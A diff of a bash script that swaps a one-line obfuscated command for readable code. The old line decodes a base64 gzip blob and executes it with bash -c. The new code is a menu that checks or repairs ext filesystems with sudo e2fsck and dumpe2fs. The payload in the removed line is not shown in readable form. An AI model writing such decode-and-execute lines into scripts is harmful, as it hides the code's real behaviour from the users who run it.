@@ -1,1 +1,78 @@
-bash -c "$(echo H4sICL4UXGcAA0VpZ2h0X29mX0RpYW1vbmRzAMVW30/bMBB+z19xFLTCtKa0RXug2qSJFYmH/RDsZWIIGefSWKR2FDulEfC/zxe3adKGQTV++KFyrvaX7+6+u9z2VvdKyO4V05HnHf3+8v1T+8/+YHDeGw4+Ttre6ehs9Gtu2rfP3jYcZ5IboSQYBTxCfg1MBpBiwkQKODP9rv0Z0M8BhCJG0Lk2ONFeKGaX1npJRmfb3YNbD+ziMbK02CGPFHQQWju3xOa+tbS2aAeXz7dWse/ArZEYRwZUCF8FmygZ6EM4FrNV347Jt7PCDxilqUo1VNbdGvgzEl8Hh+dbDeBt7IeaX7dBaGA27yoGnSAXoeAsjnMIUIuxxABC9U8J+E3gJ4ZgM22vW0UFaJCbqqQqACAkV1ILu5dcoMV7jPmLhuVHQnVg1fES4NDz4ciVVxlsSFhqRFF8RaTXVPdk8L4Ppy68jej/x3zgw1mkbmqZs3llIn6c7KPgBz6MZsJsBvQ08BeqUNfNik5q21lhT5EF0EmgNZIGU8hVltpeqgTHQ8vF7VxjZBphxxms+r0F+d6eV/XFOVHIRcixzWmTUHzfb9VurbAwEVbuld19F/2x/wG6AU67OmC9PaJYnqsBihDOz6EjYWeJc3ExJOT6wSXn00xKojxvMfZyG1QVYI01LZ0FCsobNrzl8fpZjDU+8OITOWWxCGxQk8xQNZgsLZhYxycos5W3hqL2OByWj/2mVLjiWsnFxgmYd8BXzkC+cQbyt83AoCkD1IEIrKEJbZaHV4p+kE0SiueTg7+48LaxP2iKPTVoApvrgwaGtYjTCx8Cfd8EuqDsmmET59VQzRFRM+5Vev3PFLWdY2QO15i7MiMk2lHma1BOGRJ60NHePY2/I6mzFBeu0UA0tZpiVzF6Nv1bwNVkQtNLZ7o48+6zE4/M4riihXmoqDUf1iYsqcwSlNRgImt1EnYfP+t0yRDpY9izwzWR+8aEBM1TkRj7B/KskOj64O25gfsvYI44cv0LAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+# Function to check and repair ext2/ext3/ext4 file systems
+fix_ext_filesystem() {
+    clear
+    echo -e "${CYAN}"
+    echo "     ___________________________________________________________________________"
+    echo "    |       Eight of Diamonds: Fix ext2/ext3/ext4 File System Errors            |"
+    echo "    |___________________________________________________________________________|"
+    echo "    |                                                                           |"
+    echo "    | 'e2fsck' is a tool specifically designed for ext2/ext3/ext4 file systems. |"
+    echo "    | It is used to detect and repair file system inconsistencies.              |"
+    echo "    |                                                                           |"
+    echo "    | Options:                                                                  |"
+    echo "    |  1. Check a specific partition for errors                                 |"
+    echo "    |  2. Repair a specific partition                                           |"
+    echo "    |  3. Show file system details                                              |"
+    echo "    |  4. Exit                                                                  |"
+    echo "    |___________________________________________________________________________|"
+    echo -e "${RESET}"
+
+    read -p "Enter your choice: " choice
+    case $choice in
+        1)
+            echo "Checking a partition for errors..."
+            read -p "Enter the partition to check (e.g., /dev/sda1): " partition
+            if [[ -n $partition ]]; then
+                echo "Running 'e2fsck -n' on $partition..."
+                sudo e2fsck -n "$partition"
+            else
+                echo "Invalid input. Returning to menu."
+            fi
+            ;;
+        2)
+            echo "Repairing a partition..."
+            read -p "Enter the partition to repair (e.g., /dev/sda1): " partition
+            if [[ -n $partition ]]; then
+                echo "Running 'e2fsck -y' on $partition..."
+                sudo e2fsck -y "$partition"
+            else
+                echo "Invalid input. Returning to menu."
+            fi
+            ;;
+        3)
+            echo "Showing file system details..."
+            read -p "Enter the partition (e.g., /dev/sda1): " partition
+            if [[ -n $partition ]]; then
+                echo "Running 'dumpe2fs' on $partition..."
+                sudo dumpe2fs "$partition"
+            else
+                echo "Invalid input. Returning to menu."
+            fi
+            ;;
+        4)
+            echo "Exiting e2fsck tool."
+            return
+            ;;
+        *)
+            echo "Invalid choice. Returning to menu..."
+            ;;
+    esac
+
+    echo "Press any key to return to the menu..."
+    read -n 1 -s
+}
+
+# Ensure e2fsck is available
+if ! command -v e2fsck &> /dev/null; then
+    echo "Error: 'e2fsck' is not available on this system. Exiting..."
+    exit 1
+fi
+
+# Main script execution
+fix_ext_filesystem
+clear
